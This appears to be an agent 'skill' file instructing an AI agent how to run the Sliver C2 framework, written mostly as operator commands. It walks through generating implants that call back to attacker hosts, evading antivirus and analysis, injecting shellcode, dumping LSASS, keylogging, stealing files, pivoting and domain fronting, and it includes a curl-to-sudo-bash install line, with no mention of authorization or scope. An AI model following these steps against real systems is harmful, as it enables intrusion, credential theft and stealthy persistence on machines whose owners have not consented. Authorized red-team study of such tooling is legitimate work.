---
name: sliver-c2
description: >
  Build, extend, and operate Sliver — the open-source C2 framework by BishopFox. Use when conducting
  red team operations, building and deploying implants, managing beacons and sessions, or implementing
  post-exploitation tradecraft. Use when the user asks about Sliver implant generation, C2 listeners,
  MTLS/HTTP/DNS/WireGuard channels, beacon vs session mode, BOF loading, armory extensions, multiplayer
  mode, OPSEC considerations, or comparing Sliver to Cobalt Strike and Mythic.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/BishopFox/sliver
  stars: '9.9k'
---

# sliver-c2 Agent Skill

## When to Use This Skill

Use this skill when:
- Setting up a Sliver C2 server for a red team engagement
- Generating implants (slivers) for Windows, Linux, or macOS targets
- Managing sessions (interactive) and beacons (async) post-exploitation
- Configuring listeners (mTLS, HTTPS, DNS, WireGuard)
- Performing post-exploitation: shell, file transfer, pivots, SOCKS5, screenshots
- Loading BOFs (Beacon Object Files) or armory extensions
- Designing OPSEC-conscious implant delivery and C2 communication
- Comparing Sliver capabilities against Cobalt Strike or Mythic

## What Sliver Does

Sliver is a cross-platform adversary emulation and C2 framework written in Go. Implants (also written in Go) are compiled on-the-fly by the server and support multiple transport protocols: mutual TLS (mTLS), HTTP(S), DNS, and WireGuard. The framework supports both interactive sessions and async beacon-style communication. It features a multiplayer mode for team operations, an armory of community extensions (BOFs, .NET assemblies), and a comprehensive post-exploitation operator console. Sliver positions itself as an open-source alternative to Cobalt Strike with modern OPSEC capabilities.

## Installation

```bash
# One-liner install (Linux/macOS — downloads latest release)
curl https://sliver.sh/install | sudo bash

# Manual install
VERSION=$(curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest | jq -r .tag_name)
wget "https://github.com/BishopFox/sliver/releases/download/${VERSION}/sliver-server_linux"
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Client binary (operators connect to server)
wget "https://github.com/BishopFox/sliver/releases/download/${VERSION}/sliver-client_linux"
chmod +x sliver-client_linux
sudo mv sliver-client_linux /usr/local/bin/sliver-client

# Docker
docker pull ghcr.io/bishopfox/sliver:latest
docker run --rm -it -p 31337:31337 -p 443:443 -p 80:80 ghcr.io/bishopfox/sliver:latest

# Verify
sliver-server version
```

## Server Setup

```bash
# Start server (interactive, foreground)
sudo sliver-server

# Start as systemd daemon
sudo sliver-server daemon

# First launch auto-generates:
# - Root CA certificate
# - Server TLS certificate
# - Default operator config at ~/.sliver/configs/
```

## Multiplayer Mode (Team Operations)

```bash
# On the server — create operator config for a team member
sliver > multiplayer

[server] sliver > new-operator --name alice --lhost 10.10.10.1 --lport 31337 --save /tmp/alice.cfg

# Operator connects from their machine
sliver-client import /tmp/alice.cfg
sliver-client

# List connected operators
[server] sliver > who
```

## Listeners

A listener is a C2 channel the server opens for implants to connect back to.

### mTLS (Mutual TLS) — Default, Most Stable

```
sliver > mtls

# Custom port
sliver > mtls --lport 8443

# Verify listener
sliver > jobs
```

### HTTP/HTTPS

```
# HTTPS listener with built-in self-signed cert
sliver > https

# HTTPS on custom port with domain (Let's Encrypt via ACME)
sliver > https --lhost c2.attacker.com --lport 443 --domain c2.attacker.com

# HTTP (no TLS — only for internal/lab)
sliver > http --lport 80

# HTTP with custom C2 profile (for domain fronting)
sliver > https --website fake-corp
```

### DNS

```
# DNS C2 (requires authoritative DNS server for your domain)
sliver > dns --domains c2.attacker.com

# Wildcard DNS: *.c2.attacker.com → server IP (set in registrar)
# Slow but highly evasive — tunnels over DNS TXT/A records
```

### WireGuard

```
# WireGuard transport (requires WireGuard on server)
sliver > wg --lport 51820 --nport 8888

# WireGuard is the most OPSEC-friendly transport for intranet pivoting
```

## Implant Generation

### Generate — Staged / Stageless Implants

```
# Basic mTLS implant for Windows x64
sliver > generate --mtls 10.10.10.1:4444 --os windows --arch amd64 --format exe

# HTTPS implant for Linux
sliver > generate --https c2.attacker.com --os linux --arch amd64 --format elf

# macOS shared library
sliver > generate --mtls 10.10.10.1 --os darwin --arch arm64 --format dylib

# DNS implant
sliver > generate --dns c2.attacker.com --os windows --format exe

# WireGuard implant
sliver > generate --wg 10.10.10.1:51820 --os windows --format exe

# Shellcode output (for injection)
sliver > generate --mtls 10.10.10.1 --os windows --format shellcode

# Shared library for sideloading
sliver > generate --mtls 10.10.10.1 --os windows --format shared
```

### Advanced Generation Options

```
# Custom name (avoids default random adjective_noun pattern)
sliver > generate --mtls 10.10.10.1 --os windows --save /tmp/update.exe --name CORPORATE_UPDATE

# Set multiple C2 channels (failover)
sliver > generate --mtls 10.10.10.1:4444 --https backup.c2.com --os windows

# Obfuscate symbol names (Garble)
sliver > generate --mtls 10.10.10.1 --os windows --obfuscate

# Disable default evasion (for sandbox testing)
sliver > generate --mtls 10.10.10.1 --os windows --debug

# Skip anti-analysis checks
sliver > generate --mtls 10.10.10.1 --os windows --skip-symbols

# Limit beacon to business hours (OPSEC)
sliver > generate beacon --mtls 10.10.10.1 --os windows \
  --seconds 60 --jitter 30

# Traffic profiles (custom HTTP headers/URLs for HTTPS)
sliver > profiles new --mtls 10.10.10.1 --os windows --format exe --profile-name corp-profile
sliver > profiles generate corp-profile
```

## Sessions vs Beacons

| Feature | Session | Beacon |
|---------|---------|--------|
| Communication | Interactive (real-time) | Async (check-in intervals) |
| OPSEC | Lower (persistent connection) | Higher (blend with normal traffic) |
| Commands | Immediate response | Queued, executed at check-in |
| Network noise | Continuous | Periodic (configurable interval + jitter) |
| Best for | Interactive post-exploitation | Long-term persistence |

```
# Interactive session implant
sliver > generate --mtls 10.10.10.1 --os windows --format exe

# Beacon implant (checks in every 60s ± 30s jitter)
sliver > generate beacon --mtls 10.10.10.1 --os windows \
  --seconds 60 --jitter 30 --format exe

# Convert interactive session to beacon
[session] sliver > reconfig --interval 60s --jitter 30s
```

## Operator Commands — Sessions

```
# List active sessions and beacons
sliver > sessions
sliver > beacons

# Interact with a session
sliver > use <session-id>

# Or by name prefix
sliver > use CORPORATE_UPDATE
```

### Shell and Execution

```
# Drop to shell
[session] sliver > shell

# Execute a command
[session] sliver > execute --output cmd.exe /c whoami /all

# Execute with token (use current token)
[session] sliver > execute-assembly --token SharpUp.exe audit

# PowerShell execution
[session] sliver > execute-assembly PowerView.ps1
```

### File Operations

```
# Upload a file to target
[session] sliver > upload /local/path/nc.exe C:\\Windows\\Temp\\nc.exe

# Download a file from target
[session] sliver > download C:\\Users\\admin\\Documents\\creds.xlsx /tmp/

# Browse file system
[session] sliver > ls C:\\Users

# Search files
[session] sliver > find / -name "*.config" 2>/dev/null
```

### Network and Pivoting

```
# SOCKS5 proxy (pivot through implant)
[session] sliver > socks5 start --host 127.0.0.1 --port 1080
# Configure proxychains: socks5 127.0.0.1 1080
# proxychains nmap -sT 10.10.20.0/24

# Port forward
[session] sliver > portfwd add --remote 3389 --local 13389
# RDP: xfreerdp /v:127.0.0.1:13389

# Named pipe pivot (for internal-only hosts)
sliver > pivots named-pipe

# TCP pivot
sliver > pivots tcp
```

### Screenshot and Keylogging

```
# Screenshot
[session] sliver > screenshot

# Start keylogger (Windows only)
[session] sliver > execute-assembly SharpKeylog.exe

# Collect clipboard
[session] sliver > clipboard
```

### Process Operations

```
# List processes
[session] sliver > ps

# Migrate to another process
[session] sliver > migrate --pid 1234

# Process injection (shellcode into PID)
[session] sliver > inject --pid 1234 --shellcode /tmp/payload.bin

# Dump LSASS
[session] sliver > execute-assembly SharpDump.exe
```

## BOF Loading (Beacon Object Files)

Sliver supports Cobalt Strike-compatible BOFs via the `inline-execute-assembly` command or the armory.

```
# Load a BOF directly
[session] sliver > bof /path/to/bof.obj go_arg1

# Common BOFs (from TrustedSec, CS-Situational-Awareness-BOF)
# - whoami_bof
# - dir_bof
# - netstat_bof
# - reg_query_bof

# Install armory (community BOFs, .NET tools, aliases)
sliver > armory install all

# List armory packages
sliver > armory search

# Install specific package
sliver > armory install SharpView
sliver > armory install Seatbelt

# Use installed alias
[session] sliver > seatbelt -group=user
[session] sliver > sharpview Get-DomainComputer
```

## OPSEC Considerations

### Implant OPSEC

```
✓ Use --obfuscate (Garble) to randomize symbol names and strings
✓ Use beacon mode with jitter (--jitter 30+) to blend check-ins
✓ Use HTTPS over mTLS when mTLS traffic is detectable by DPI
✓ Use DNS C2 for heavily monitored environments (slow but stealthy)
✓ Use WireGuard for internal pivoting to avoid plain TCP detection
✓ Avoid shell command (creates cmd.exe child process) — use execute instead
✓ Use inline BOFs instead of fork-and-run for sensitive operations
✗ Avoid default random name format (ADJECTIVE_NOUN) — it's a known Sliver IOC
✗ Avoid default ports (8888, 31337, 4444) — use non-standard ports
```

### Infrastructure OPSEC

```bash
# Redirectors: Nginx → Sliver server
# nginx.conf snippet:
location / {
    # Only proxy if path matches C2 profile URLs
    if ($request_uri ~* "^/api/v1/(assets|update)") {
        proxy_pass https://backend-sliver-server:443;
    }
    # Otherwise serve decoy content
    return 200 "OK";
}

# CDN domain fronting (HTTPS only):
# Set Host header to allowed CDN host → traffic routed to Sliver
# Requires HTTPS listener with matching domain
```

## Comparison with Cobalt Strike and Mythic

| Feature | Sliver | Cobalt Strike | Mythic |
|---------|--------|---------------|--------|
| License | Open Source (MIT) | Commercial ($$$) | Open Source |
| Language | Go | Java (server) | Python (server) |
| Implant language | Go | C (Beacon) | Multiple |
| mTLS support | Yes | No | Varies by agent |
| DNS C2 | Yes | Yes | Varies |
| BOF support | Yes | Yes (native) | Via C2 profiles |
| BYOI (Bring Your Own Implant) | Limited | Limited | Strong point |
| Multiplayer | Yes | Yes (teamserver) | Yes |
| Armory/Kit | Yes (armory) | Arsenal Kit | Agent community |
| Detection rate | Medium (improving) | High (well-signatured) | Variable |
| Best for | Open-source red teams | Enterprise red teams | Research/custom agents |

## Troubleshooting

| Issue | Fix |
|-------|-----|
| Implant not connecting | Verify listener is running: `sliver > jobs`; check firewall rules |
| mTLS connection refused | Ensure port is open: `sudo ufw allow 4444` or use `iptables` |
| Session drops immediately | Target AV killed implant; use `--obfuscate` or stageless shellcode |
| BOF crashes session | BOF bug or incompatible version; test with known-good BOF first |
| DNS C2 not working | Verify NS record points to Sliver server; check authoritative DNS config |
| Certificate error (HTTPS) | Use `--domain` with valid cert or disable verification in test environments |
| Armory install fails | Check internet connectivity from server; try `armory install <pkg>` individually |
| Cannot execute assembly | May need to enable CLR: `execute cmd.exe /c reg query HKLM\...` first |
| High latency on beacon tasks | Expected — beacon executes at next check-in; reduce `--seconds` for faster response |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
